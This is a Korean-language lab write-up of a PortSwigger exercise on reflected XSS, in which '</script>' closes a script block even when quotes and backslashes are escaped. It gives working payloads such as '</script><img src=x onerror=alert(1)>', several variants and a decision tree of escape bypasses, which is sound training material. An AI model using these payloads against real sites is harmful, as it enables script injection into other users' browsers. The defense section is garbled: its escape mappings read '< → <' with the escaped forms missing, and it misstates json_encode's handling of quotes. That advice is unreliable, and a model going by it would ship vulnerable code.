# Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Scripting (XSS) — Reflected / JS 문자열 / `'` + `\` 이중 이스케이프 / HTML 파서 우선 동작
- **링크**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped

## 목표

`'` 와 `\` 가 모두 이스케이프되어 JS 문자열 탈출이 불가능한 상황에서, HTML 파서의 `</script>` 처리 우선순위를 이용해 `alert()` 를 실행시킨다.

## 취약점 분석

검색어가 `<script>` 블록 내 JS 문자열에 반영된다.

```html
<script>
  var searchTerms = 'USER_INPUT';
</script>
```

서버는 두 문자를 모두 이스케이프한다.

```
입력: '   → 출력: \'
입력: \   → 출력: \\
```

이스케이프 처리 순서: `\` 를 먼저 `\\` 로 치환한 뒤, `'` 를 `\'` 로 치환한다.

## 009 랩 방식이 통하지 않는 이유

009 랩에서 배운 `\` + `'` 조합 우회:

```
입력: \'
서버 처리:
  1단계 — \ 를 먼저 이스케이프: \  →  \\
  2단계 — ' 를 이스케이프:      '  →  \'
  결과: \\\'

JS 파서 해석:
  \\  = 리터럴 백슬래시 문자
  \'  = 이스케이프된 단일 따옴표 (문자열 종료 아님!)
→ 문자열 탈출 실패
```

`\` 와 `'` 를 **올바른 순서로 모두 이스케이프**하면 009 랩의 `\\` 트릭이 막힌다.

## 핵심 원리 — HTML 파서 vs JS 파서의 처리 순서

브라우저는 HTML 파싱과 JS 실행을 별도 레이어에서 처리한다.

```
HTML 파서 (우선)    →    JS 파서 (이후)
```

**HTML 파서는 `<script>` 내부에서도 `</script>` 를 먼저 인식하고 스크립트 블록을 닫는다.**  
JS 파서는 HTML 파서가 스크립트 블록을 결정한 이후에 그 내용을 평가한다.

```html
<script>
  var x = 'hello </script> world';
  <!-- HTML 파서: </script> 발견 → 스크립트 블록 종료 -->
  <!-- JS 파서: 'hello 만 보임 → 불완전한 문자열이지만 무시 -->
</script>
```

`</script>` 뒤의 ` world';` 는 HTML로 렌더링된다.

## 공격 방법

### 페이로드

```
</script><img src=x onerror=alert(1)>
```

### 생성되는 HTML

```html
<script>
  var searchTerms = '</script><img src=x onerror=alert(1)>';
</script>
```

### 파싱 흐름

```
HTML 파서:
  <script> 시작 → JS 모드 진입
  var searchTerms = '  → JS 문자열 시작 (파서는 관심 없음)
  </script>  발견 → JS 모드 종료 (문자열 내부라도 강제 종료!)
         ↓
  <img src=x onerror=alert(1)>  → 일반 HTML로 처리
         ↓
  onerror 발화 → alert(1) 실행

JS 파서:
  var searchTerms = '  → 불완전한 코드 → 에러 또는 무시
  (이미 HTML 파서가 블록을 닫았으므로 JS 실행은 실패하지만 무관)
```

## 009 vs 012 vs 018 — JS 문자열 이스케이프 우회 비교

| 항목 | 009 | 012 (DOM) | 018 (이번 랩) |
|------|-----|-----------|--------------|
| 이스케이프 대상 | `<>` (HTML) | `"` | `'` + `\` |
| `'` 이스케이프 | X | — | O (`\'`) |
| `\` 이스케이프 | X | X | O (`\\`) |
| `\` 역이용 가능 | O (`\\'`) | O (`\\"`) | **X** (`\\\'` 로 막힘) |
| 우회 방법 | `'` 직접 삽입 | `\"` → `\\"` | `</script>` HTML 파서 우선 |
| 탈출 대상 | JS 문자열 | JSON 문자열 | **`<script>` 블록 자체** |

이번 랩은 JS 문자열을 탈출하는 게 아니라 **스크립트 블록 자체를 종료**시키는 방향으로 전환한 것이 핵심이다.

## 핵심 정리

- `'` 와 `\` 를 올바른 순서로 모두 이스케이프하면 JS 문자열 탈출이 불가능하다.
- 그러나 HTML 파서는 `<script>` 내부의 `</script>` 를 JS 컨텍스트와 무관하게 먼저 처리한다.
- `</script>` 로 스크립트 블록을 강제 종료하면, 이후 삽입된 HTML이 정상적으로 렌더링된다.
- **방어**:
  - JS에 삽입되는 값은 `</script>` 문자열도 이스케이프 (`<` → `<` 또는 `&lt;`)
  - `JSON.stringify()` 는 `<` 를 `<` 로 이스케이프하여 이 공격을 방어함
  - CSP `unsafe-inline` 비허용

## 배운 점 및 추가 학습

### 1. HTML 파서의 `</script>` 처리 규칙

HTML 스펙에 따르면 `<script>` 내용은 `</script>` 가 나타날 때까지의 원시 텍스트(raw text)다.  
JS 파서가 문자열 안이라고 판단하더라도 HTML 파서는 `</script>` 를 먼저 인식한다.

```html
<!-- 모두 </script> 에서 스크립트 블록이 종료됨 -->

<script>var x = '</script>';            <!-- JS: 에러 / HTML: 정상 종료 -->
<script>var x = "foo </script> bar";    <!-- JS: 에러 / HTML: 정상 종료 -->
<script>// 주석 </script>               <!-- JS: 주석 안 / HTML: 종료 -->
<script>/* </script> */</script>        <!-- JS: 블록 주석 안 / HTML: 첫 번째에서 종료 -->
```

### 2. `</script>` 를 안전하게 삽입하는 올바른 서버 처리

```javascript
// 위험 — </script> 가 그대로 삽입됨
var searchTerms = '<?php echo $input; ?>';

// 위험 — ' 와 \ 만 이스케이프 (이번 랩 취약점)
var searchTerms = '<?php echo addslashes($input); ?>';

// 안전 — JSON 직렬화로 < 도 유니코드 이스케이프
var searchTerms = <?php echo json_encode($input); ?>;
// ' → \'
// \ → \\
// < → <  ← </script> 공격 차단
// > → >
// & → &
```

`JSON.stringify()` / `json_encode()` 는 `<`, `>`, `&` 를 `<`, `>`, `&` 로 이스케이프하므로 `</script>` 가 HTML 파서에 의해 해석되지 않는다.

### 3. `</script>` 탈출의 다양한 변형

```html
<!-- 기본형 -->
</script><img src=x onerror=alert(1)>

<!-- svg 조합 -->
</script><svg onload=alert(1)>

<!-- script 재삽입 -->
</script><script>alert(1)</script>

<!-- 대소문자 변형 (HTML 파서는 대소문자 무시) -->
</SCRIPT><img src=x onerror=alert(1)>
</Script><img src=x onerror=alert(1)>

<!-- 속성 삽입 (일부 파서에서 동작) -->
</script ><img src=x onerror=alert(1)>
```

### 4. JS 문자열 탈출 방법 전체 결정 트리

```
JS 문자열에 삽입된 상황
    │
    ├── ' 가 이스케이프 안 됨
    │     → '-alert(1)-'  또는  ';alert(1)//  (009 랩)
    │
    ├── ' 만 이스케이프, \ 는 안 됨
    │     → \'-alert(1)-\'  (\ 로 이스케이프 무력화)
    │
    ├── " 만 이스케이프, \ 는 안 됨 (JSON 컨텍스트)
    │     → \"-alert(1)}//  (012 랩)
    │
    ├── ' 와 \ 모두 이스케이프 (올바른 순서)    ← 이번 랩
    │     → JS 문자열 탈출 불가
    │     → </script> 로 스크립트 블록 자체 종료
    │     → 이후 HTML로 XSS 삽입
    │
    └── ' 와 \ 모두 이스케이프 + </script> 도 이스케이프
          → XSS 불가 (올바른 방어)
```

### 5. 파서 우선순위가 중요한 이유

HTML과 JS는 별도 파서가 처리하며, 파서 간 경계에서 의도치 않은 동작이 발생할 수 있다.

```
[HTML 파서]
  <script> → JS 모드로 전환
  </script> → HTML 모드로 복귀  ← 항상 최우선
  나머지는 JS 파서에 위임

[JS 파서]
  HTML 파서가 잘라준 블록 내용만 평가
  '</script>' 같은 문자열은 HTML 파서가 이미 처리했으므로 볼 수 없음
```

이 파서 간 경계(parser confusion)는 XSS 외에도 Mutation XSS(mXSS), 템플릿 인젝션 등 다양한 공격의 근원이 된다.
